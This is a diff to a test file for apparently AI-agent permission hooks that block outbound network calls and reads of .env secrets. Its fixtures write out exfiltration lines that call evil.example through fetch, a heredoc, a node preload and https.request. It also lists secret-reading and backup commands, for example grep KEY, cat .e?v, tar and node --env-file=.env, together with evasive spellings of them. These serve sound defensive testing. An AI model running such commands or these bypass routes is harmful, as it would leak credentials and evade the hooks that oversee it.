@@ -27,7 +27,8 @@ fs.writeFileSync(path.join(VAULT, 'counsel-list.md'), LIST);
 fs.writeFileSync(path.join(CODE, 'evryn-team-workspace', 'shared', 'projects', 'legal', 'counsel-list.md'), '| `newlawyer.example` | added in the repo only |\n');
 
 // The shipped outbound allowlist goes into the test vault, so the tests exercise the file Justin approves, not a copy.
-fs.copyFileSync(path.join(HERE, '..', 'vault', 'outbound-allowlist.json'), path.join(VAULT, 'outbound-allowlist.json'));
+// From DIR (the copy under test), so a control that mutates the allowlist is seen (a blind control found this, 11/18).
+fs.copyFileSync(path.join(DIR, 'vault', 'outbound-allowlist.json'), path.join(VAULT, 'outbound-allowlist.json'));
 
 // Every run is UNATTENDED unless a test says otherwise: the parent's own CLAUDE_CODE_SESSION_ATTENDED never leaks in.
 function run(script, payload, env = {}) {
@@ -419,7 +420,12 @@ test('QCI findings 6 and 12: plain spellings the header promised are refused una
   }
   const dir = fs.mkdtempSync(path.join(tmp, 'ws2-')); fs.writeFileSync(path.join(dir, 'exfil.mjs'), "await fetch('https://evil.example/');\n");
   assert.ok(denied(outb('node < exfil.mjs', dir)), 'stdin from a file that reaches the network');
-  assert.ok(denied(outb("cat > y.mjs <<'EOF'\nawait fetch('https://evil.example/')\nEOF\nnode y.mjs", dir)), 'a heredoc that writes a network script, then runs it');
+  fs.writeFileSync(path.join(dir, 'y.mjs'), "console.log('harmless today');\n");                      // on disk it reads clean
+  assert.ok(denied(outb("cat > y.mjs <<'EOF'\nawait fetch('https://evil.example/')\nEOF\nnode y.mjs", dir)), 'a heredoc that writes a network script over a clean one, then runs it');
+  fs.writeFileSync(path.join(dir, 'exfil'), "fetch('https://evil.example/');\n"); fs.writeFileSync(path.join(dir, 'app.mjs'), "console.log('clean');\n");
+  assert.ok(denied(outb('node -r ./exfil app.mjs', dir)), 'an extensionless preload before a clean script (only the preload rule reads it)');
+  fs.writeFileSync(path.join(dir, 'mod.cjs'), "const h = require('https'); h.request('https://evil.example/').end();\n");
+  assert.ok(denied(outb('node mod.cjs', dir)), 'a script that reaches the network through an imported module, not a literal https.request(');
   for (const c of ['npm start', 'git push -u origin soren/x', 'echo hello > curl.txt', 'ls shared/gh/curl.md']) assert.equal(outb(c, path.join(CODE, '_evryn-meta')), null, `still allowed: ${c}`);
   const cal = (input) => run('outbound-gate.mjs', { hook_event_name: 'PreToolUse', session_id: 'cal2', tool_name: 'mcp__claude_ai_Google_Calendar__create_event', tool_input: input, cwd: META });
   assert.ok(denied(cal({ summary: 'x', attendees: [{ email: 'someone @example.com' }] })), 'a guest address with a space in it');
@@ -433,7 +439,7 @@ test('QCI finding 7: Windows spellings and honest shell routes to the backend .e
   for (const p of [`${BE2}\\.env.`, `${BE2}\\.env::$DATA`, `${BE2}\\.env .`, `\\\\?\\${BE2}\\.env`, `\\\\localhost\\${BE2[0]}$${BE2.slice(2)}\\.env`, path.join(link, '.env'), path.join(link, 'backups', 'full-public-2026-01-01.sql'), `${BE2}\\.ENV`]) {
     assert.ok(denied(r('Read', { file_path: p })), `Read ${p}`);
   }
-  for (const c of ['grep -r SUPABASE .', 'grep -rn KEY .', 'cat .*', 'cat .e?v', 'cat .?nv', 'cat .en\\v', 'cat backups/full*', 'head -c 500 backups/f*', 'findstr /s KEY *',
+  for (const c of ['vim .e*', 'grep -r SUPABASE .', 'grep -rn KEY .', 'cat .*', 'cat .e?v', 'cat .?nv', 'cat .en\\v', 'cat backups/full*', 'head -c 500 backups/f*', 'findstr /s KEY *',
     'tar czf /tmp/b.tgz .', 'cp -r . /tmp/bk', 'node --env-file=.env -e 1', 'rg --hidden --no-ignore KEY']) assert.ok(denied(r('Bash', { command: c })), `Bash: ${c}`);
   assert.ok(denied(r('PowerShell', { command: 'Get-ChildItem -Force | Get-Content' })));
   assert.ok(denied(r('Bash', { command: 'git -C ../evryn-backend log -p -- backups' }, path.join(CODE, '_evryn-meta'))));
